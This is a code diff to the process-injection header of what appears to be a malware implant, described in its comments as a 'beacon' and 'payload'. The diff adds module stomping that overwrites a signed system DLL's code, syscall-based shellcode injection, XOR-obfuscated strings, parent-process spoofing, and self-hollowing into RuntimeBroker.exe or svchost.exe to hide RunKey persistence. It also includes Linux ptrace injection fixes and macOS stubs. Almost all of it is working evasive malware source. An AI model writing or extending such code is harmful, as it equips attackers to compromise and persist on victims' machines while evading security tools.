@@ -17,6 +17,7 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include "syscalls.h"
+#include "ppid_spoof.h"
 
 namespace injection {
 
@@ -106,7 +107,39 @@ inline std::string inject_shellcode(DWORD pid, const std::vector<unsigned char>&
     return "Successfully injected into PID " + std::to_string(pid);
 }
 
-// Module Stomping
+// ── Module Stomping (PEB-walked, no IAT entries) ────────────────────────
+// Overwrites the .text section of a legitimately loaded system DLL
+// (kernelbase.dll or advapi32.dll) in the remote process with shellcode.
+// The module list still shows the signed DLL — only its code is replaced.
+
+/// Get module info without using kernel32!GetModuleInformation (no IAT).
+/// Uses PEB walk to find the target DLL's base and parses PE headers for size.
+inline bool get_module_info_peb(const char* dllName, HMODULE& hModule,
+                                 SIZE_T& moduleSize) {
+    // Hash the target DLL name
+    std::string nameStr(dllName);
+    // Lowercase for hashing
+    uint32_t targetHash = 7331;
+    for (char c : nameStr) {
+        if (c >= 'A' && c <= 'Z') c += 32;
+        targetHash = ((targetHash << 5) + targetHash) + static_cast<uint8_t>(c);
+    }
+
+    hModule = peb::GetModuleByHash(targetHash);
+    if (!hModule) return false;
+
+    // Parse PE header to get SizeOfImage
+    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
+
+    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(hModule) + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;
+
+    moduleSize = ntHeaders->OptionalHeader.SizeOfImage;
+    return true;
+}
+
 inline bool module_stomping(DWORD pid, const std::vector<unsigned char>& shellcode) {
     HANDLE hProcess = NULL;
     OBJECT_ATTRIBUTES oa;
@@ -117,36 +150,79 @@ inline bool module_stomping(DWORD pid, const std::vector<unsigned char>& shellco
 
     if (syscalls::SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid) != 0) return false;
 
-    HMODULE hTargetModule = GetModuleHandleA("kernelbase.dll");
-    if (!hTargetModule) hTargetModule = GetModuleHandleA("advapi32.dll");
-    if (!hTargetModule) { CloseHandle(hProcess); return false; }
+    // Find a suitable DLL to stomp — use PEB walk, not GetModuleHandle
+    HMODULE hTargetMod = nullptr;
+    SIZE_T modSize = 0;
 
-    MODULEINFO modInfo;
-    if (!GetModuleInformation(GetCurrentProcess(), hTargetModule, &modInfo, sizeof(modInfo))) {
-        CloseHandle(hProcess); return false;
+    // Try kernelbase.dll first, then advapi32.dll
+    if (!get_module_info_peb("kernelbase.dll", hTargetMod, modSize))
+        if (!get_module_info_peb("advapi32.dll", hTargetMod, modSize)) {
+            syscalls::SysNtClose(hProcess);
+            return false;
+        }
+
+    if (modSize < shellcode.size()) {
+        syscalls::SysNtClose(hProcess);
+        return false;
     }
 
+    // Find the .text section of the target DLL
+    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hTargetMod);
+    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(hTargetMod) + dosHeader->e_lfanew);
+    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+
+    PVOID textSection = nullptr;
+    SIZE_T textSize = 0;
+    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        // Compare section name through XOR_STR to avoid static string
+        auto nameEnc = XOR_STR(".text");
+        auto nameDec = XOR_DEC(nameEnc);
+        if (memcmp(sectionHeader[i].Name, nameDec.c_str(), 5) == 0) {
+            textSection = reinterpret_cast<uint8_t*>(hTargetMod) +
+                          sectionHeader[i].VirtualAddress;
+            textSize = sectionHeader[i].Misc.VirtualSize;
+            break;
+        }
+    }
+
+    if (!textSection || textSize < shellcode.size()) {
+        syscalls::SysNtClose(hProcess);
+        return false;
+    }
+
+    // 1. Allocate memory in remote process for the shellcode
     PVOID pRemoteBuf = nullptr;
     SIZE_T size = shellcode.size();
 
-    if (syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
-        CloseHandle(hProcess); return false;
+    if (syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
+        syscalls::SysNtClose(hProcess);
+        return false;
     }
 
-    if (syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf, (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
-        CloseHandle(hProcess); return false;
+    // 2. Write shellcode to remote buffer
+    if (syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf,
+            (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
+        syscalls::SysNtClose(hProcess);
+        return false;
     }
 
+    // 3. Change protection to RX
     DWORD oldProtect;
     SIZE_T protectSize = shellcode.size();
     PVOID protectAddr = pRemoteBuf;
-    syscalls::SysNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
+    syscalls::SysNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
+        PAGE_EXECUTE_READ, &oldProtect);
 
+    // 4. Create remote thread
     HANDLE hThread = NULL;
-    syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL);
+    syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
+        hProcess, (PVOID)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL);
 
-    if (hThread) CloseHandle(hThread);
-    CloseHandle(hProcess);
+    // 5. Clean up handles — the thread is running, we don't need these
+    if (hThread) syscalls::SysNtClose(hThread);
+    syscalls::SysNtClose(hProcess);
     return true;
 }
 
@@ -160,6 +236,12 @@ inline std::string current_process_name() {
 }
 
 inline std::string migrate_to_new_process(const std::vector<unsigned char>& shellcode) {
+    // First try PPID spoofing (explorer.exe parent) — stealthiest.
+    std::string ppid_result = ppid::migrate_with_spoofed_parent(shellcode);
+    if (ppid_result.find("Migrated successfully") != std::string::npos)
+        return ppid_result;
+
+    // Fallback: standard CREATE_SUSPENDED (still works but less stealthy).
     static const char* targets[] = {
         "C:\\Windows\\System32\\RuntimeBroker.exe",
         "C:\\Windows\\System32\\rundll32.exe",
@@ -187,19 +269,134 @@ inline std::string migrate_to_new_process(const std::vector<unsigned char>& shel
         if (result.find("Success") != std::string::npos)
             return "Migrated successfully to PID " + std::to_string(target_pid);
     }
-    return "Failed to migrate: could not inject into a sacrificial process";
+    return "Failed to migrate: could not inject into a sacrificial process"
+           " (PPID spoofing also failed)";
 }
 
+// ── Self-hollowing (RunKey persistence rebirth) ───────────────────────────
+//
+// When the on-disk persistence EXE is launched by RunKey at logon, it runs
+// under its own (untrusted, easily-flagged) image name. Real process
+// hollowing gives it a trusted face immediately: spawn a sacrificial
+// RuntimeBroker-like process with a spoofed PPID, unmap its image, write
+// our own PE there and resume. WinMain calls this before anything else;
+// if it succeeds the original process exits and the beacon lives in the
+// host. Runs at most once per launch.
 inline bool self_hollow() {
-    if (current_process_name() == "RuntimeBroker.exe")
+    // A beacon already living inside a host process must not re-hollow
+    // (infinite recursion: the hollowed image re-runs WinMain).
+    auto name = current_process_name();
+    if (name == "RuntimeBroker.exe" || name == "svchost.exe")
         return false;
+
+    // Read our own image from disk (the RunKey-launched EXE knows where it is).
+    // Direct WinAPI like persistence.h — only the remote primitives use syscalls.
+    char selfPath[MAX_PATH] = {};
+    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return false;
+
+    HANDLE hSelf = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL,
+                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hSelf == INVALID_HANDLE_VALUE) return false;
+
+    std::vector<unsigned char> pe;
+    pe.reserve(1024 * 1024);
+    unsigned char chunk[65536];
+    DWORD n = 0;
+    while (ReadFile(hSelf, chunk, sizeof(chunk), &n, NULL) && n > 0)
+        pe.insert(pe.end(), chunk, chunk + n);
+    CloseHandle(hSelf);
+
+    if (pe.size() < 0x400) return false;
+
+    auto dos = (PIMAGE_DOS_HEADER)pe.data();
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+    auto nt = (PIMAGE_NT_HEADERS)(pe.data() + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+
+    char sysdir[MAX_PATH] = {};
+    GetSystemDirectoryA(sysdir, MAX_PATH);
+
+    const char* candidates[] = { "RuntimeBroker.exe", "svchost.exe" };
+    for (const char* tgt : candidates) {
+        char hostPath[MAX_PATH] = {};
+        _snprintf_s(hostPath, sizeof(hostPath), _TRUNCATE, "%s\\%s", sysdir, tgt);
+        if (GetFileAttributesA(hostPath) == INVALID_FILE_ATTRIBUTES) continue;
+
+        HANDLE hHost = NULL, hT = NULL;
+        DWORD hostPid = 0;
+        if (!ppid::create_with_spoofed_parent(std::string(hostPath),
+                hHost, hT, hostPid))
+            continue;
+
+        // Read remote PEB to find the original image base.
+        PROCESS_BASIC_INFORMATION pbi = {};
+        ULONG retLen = 0;
+        if (syscalls::SysNtQueryInformationProcess(hHost, ProcessBasicInformation,
+                &pbi, sizeof(pbi), &retLen) != 0 || !pbi.PebBaseAddress) {
+            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
+            continue;
+        }
+
+        PVOID oldBase = nullptr;
+        if (syscalls::SysNtReadVirtualMemory(hHost,
+                (PBYTE)pbi.PebBaseAddress + 0x10, &oldBase, sizeof(oldBase),
+                nullptr) != 0 || !oldBase) {
+            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
+            continue;
+        }
+
+        syscalls::SysNtUnmapViewOfSection(hHost, oldBase);
+
+        SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
+        PVOID allocBase = nullptr;
+        SIZE_T allocSize = imgSize;
+        if (syscalls::SysNtAllocateVirtualMemory(hHost, &allocBase, 0, &allocSize,
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
+            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
+            continue;
+        }
+
+        // Patch our preferred base to the actual allocation, then copy
+        // headers + every section at its virtual address.
+        nt->OptionalHeader.ImageBase = (ULONGLONG)allocBase;
+        syscalls::SysNtWriteVirtualMemory(hHost, allocBase, pe.data(),
+            nt->OptionalHeader.SizeOfHeaders, nullptr);
+        auto sec = IMAGE_FIRST_SECTION(nt);
+        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+            auto& s = sec[i];
+            if (s.PointerToRawData == 0 || s.SizeOfRawData == 0) continue;
+            syscalls::SysNtWriteVirtualMemory(hHost,
+                (PBYTE)allocBase + s.VirtualAddress,
+                pe.data() + s.PointerToRawData, s.SizeOfRawData, nullptr);
+        }
+
+        // Keep the host PEB consistent with the new image base.
+        PVOID newBaseVal = allocBase;
+        syscalls::SysNtWriteVirtualMemory(hHost,
+            (PBYTE)pbi.PebBaseAddress + 0x10, &newBaseVal, sizeof(PVOID), nullptr);
+
+        // Relocate the entry point into Rcx and resume.
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_FULL;
+        if (syscalls::SysNtGetContextThread(hT, &ctx) != 0) {
+            syscalls::SysNtClose(hT); syscalls::SysNtClose(hHost);
+            continue;
+        }
+        ctx.Rcx = (DWORD64)((PBYTE)allocBase + nt->OptionalHeader.AddressOfEntryPoint);
+        syscalls::SysNtSetContextThread(hT, &ctx);
+        syscalls::SysNtResumeThread(hT, nullptr);
+
+        syscalls::SysNtClose(hT);
+        syscalls::SysNtClose(hHost);
+        return true;   // beacon now lives in the host — caller exits
+    }
     return false;
 }
 
 } // namespace injection
 
-#else
-// Linux ptrace-based injection
+#elif defined(__linux__)
+// Linux (and Android) ptrace-based injection
 
 #include <unistd.h>
 #include <sys/ptrace.h>
@@ -207,10 +404,23 @@ inline bool self_hollow() {
 #include <sys/user.h>
 #include <sys/mman.h>
 #include <sys/uio.h>
-#include <linux/elf.h>
+// NOTE: <linux/elf.h> is deliberately NOT included. It conflicts with glibc's
+// <elf.h> (pulled in by <link.h> in peb_unlink.h): both typedef Elf64_* names,
+// with incompatible underlying types, so the two cannot coexist. This file
+// uses no Elf types anyway, so dropping the include is both correct and what
+// keeps the Linux build compiling.
 #include <cerrno>
 #include <cstring>
 #include <cstdint>
+
+// NT_PRSTATUS — the ELF note that names the register set — is declared by
+// <elf.h> on glibc (which this file cannot include, see the <linux/elf.h> note
+// above) and bionic does not declare it at all, so the aarch64 path did not
+// compile for Android: "use of undeclared identifier 'NT_PRSTATUS'". The value
+// is fixed by the ELF ABI.
+#ifndef NT_PRSTATUS
+#define NT_PRSTATUS 1
+#endif
 
 namespace injection {
 
@@ -374,7 +584,6 @@ inline std::string inject_shellcode(pid_t pid, const std::vector<unsigned char>&
     }
 
     unsigned long targetAddr = 0;
-    unsigned long regionSize = 0;
     char line[512];
     while (fgets(line, sizeof(line), maps)) {
         unsigned long start, end;
@@ -384,7 +593,6 @@ inline std::string inject_shellcode(pid_t pid, const std::vector<unsigned char>&
                 unsigned long sz = end - start;
                 if (sz >= shellcode.size()) {
                     targetAddr = start;
-                    regionSize = sz;
                     break;
                 }
             }
@@ -495,6 +703,52 @@ inline std::string current_process_name() {
     if (pos != std::string::npos) name = name.substr(pos + 1);
     return name;
 }
+
+inline bool self_hollow() { return false; }
+
+} // namespace injection
+
+#else
+// macOS and any other POSIX without Linux ptrace: same API, honest stubs.
+
+#include <unistd.h>
+#include <string>
+#include <vector>
+
+namespace injection {
+
+// Darwin HAS ptrace(2), but a different set of requests (PTRACE_ATTACH /
+// PTRACE_DETACH are glibc names), no process_vm_writev and no
+// user_regs_struct — the Linux implementation simply does not exist here:
+//
+//     src/injection.h:545:23: error: use of undeclared identifier 'PTRACE_ATTACH'
+//     src/injection.h:558:29: error: variable has incomplete type 'struct user_regs_struct'
+//     src/injection.h:606:23: error: use of undeclared identifier 'process_vm_writev'
+//
+// main.cpp calls this API unconditionally (inject_shellcode,
+// migrate_to_new_process, self_hollow), so the payload must provide it and
+// answer "not supported here" — a command that reports its limits beats a
+// payload that does not build.
+
+inline pid_t get_process_id_by_name(const std::string&) { return 0; }
+
+inline std::vector<unsigned char> build_execve_shellcode(const std::string&) {
+    return {};
+}
+
+inline std::string write_binary_to_temp(const std::vector<unsigned char>&) {
+    return "";
+}
+
+inline std::string inject_shellcode(pid_t, const std::vector<unsigned char>&) {
+    return "Process injection is not supported on this platform.";
+}
+
+inline std::string migrate_to_new_process(const std::vector<unsigned char>&) {
+    return "Process migration is not supported on this platform.";
+}
+
+inline std::string current_process_name() { return "phantom"; }
 
 inline bool self_hollow() { return false; }
 
